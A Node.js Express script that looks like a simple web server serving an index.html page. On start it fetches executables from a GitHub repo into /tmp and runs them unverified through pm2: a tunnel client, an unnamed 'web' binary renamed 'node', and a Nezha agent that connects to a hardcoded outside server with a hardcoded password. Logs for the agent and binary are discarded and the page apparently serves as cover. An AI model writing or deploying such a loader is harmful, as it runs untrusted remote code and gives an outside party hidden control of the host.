#!/usr/bin/env node

const express = require('express');
const fs = require('fs');
const path = require('path');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const axios = require('axios');

const app = express();
app.use(express.json());

const PWD = '/tmp';
const port = process.env.PORT || 3000;

const NEZHA_SERVER = process.env.NEZHA_SERVER || 'data.king360.eu.org:443';
const NEZHA_PASSWORD = process.env.NEZHA_PASSWORD || '147';
const NEZHA_TLS = !!(NEZHA_SERVER.endsWith('443'));

const pm2Config = {
    apps: [
        {
            name: 'cc',
            script: `${PWD}/cc`,
            args: `tunnel --url http://localhost:30070 --no-autoupdate --edge-ip-version auto --protocol http2`,
            autorestart: true,
            restart_delay: 5000,
            error_file: 'argo-err.log',
            out_file: 'argo.log',
        },
        {
            name: 'app',
            script: `${PWD}/node`,
            autorestart: true,
            restart_delay: 5000,
            error_file: 'NULL',
            out_file: 'NULL',
        },
        {
            name: 'agent',
            script: `${PWD}/agent`,
            args: `-s ${NEZHA_SERVER} -p ${NEZHA_PASSWORD} ${NEZHA_TLS ? '--tls' : ''}`,
            autorestart: true,
            restart_delay: 5000,
            error_file: 'NULL',
            out_file: 'NULL',
        },
    ],
};

const configJSON = JSON.stringify(pm2Config, null, 2);
fs.writeFileSync(path.join(PWD, 'ecosystem.config.js'), `module.exports = ${configJSON};`);

const downloadFiles = async () => {
    const files = {
        "index.html": "https://github.com/lemongaa/pack/raw/main/index.html",
        "node": "https://github.com/lemongaa/pack/raw/main/web",
        "cc": "https://github.com/lemongaa/pack/raw/main/cc",
        "agent": "https://github.com/lemongaa/pack/raw/main/agent"
    };

    for (let file of Object.keys(files)) {
        let filePath = path.join(PWD, file);
        try {
            await fs.promises.access(filePath, fs.constants.F_OK);
            console.log(`文件 ${file} 已存在，跳过下载`);
        } catch (err) {
            let stream = fs.createWriteStream(filePath);
            const response = await axios({
                method: 'get',
                url: files[file],
                responseType: 'stream'
            });
            response.data.pipe(stream);
            await new Promise((resolve, reject) => {
                stream.on('finish', () => {
                    fs.chmodSync(filePath, 0o755);
                    console.log(`文件 ${file} 下载完成`);
                    resolve();
                });
                stream.on('error', reject);
            });
        }
    }
};

const startPM2 = async () => {
    try {
        const { stdout } = await exec(`npx pm2 start ${path.join(PWD, 'ecosystem.config.js')}`);
        console.log('PM2 启动结果:\n' + stdout);
    } catch (error) {
        console.log(`启动 PM2 出错: ${error}`);
        throw error;
    }
};

const startService = async (serviceName) => {
    try {
        const { stdout } = await exec(`npx pm2 ls | grep ${serviceName}`);
        if (stdout.trim().includes('online')) {
            console.log(`${serviceName} already running`);
        } else {
            const { stdout } = await exec(`npx pm2 start ${serviceName}`);
            console.log(`${serviceName} start success: ${stdout}`);
        }
    } catch (err) {
        console.log('exec error: ' + err);
    }
};

const init = async () => {
    await downloadFiles();
    await startPM2();
    const services = ['cc', 'agent', 'app'];
    for (let service of services) {
        await startService(service);
    }
    console.log('所有文件下载完成！');
};

init();

app.get('/', (req, res) => {
  const indexPath = path.join(PWD, 'index.html');

  fs.readFile(indexPath, 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send('Internal Server Error');
    } else {
      res.status(200).send(data); // 返回200状态码
    }
  });
});
  
  app.listen(port, () => {
    console.log(`Server running on port ${port}.`);
  });
  
  // 保持进程运行
  setInterval(() => {}, 1000);
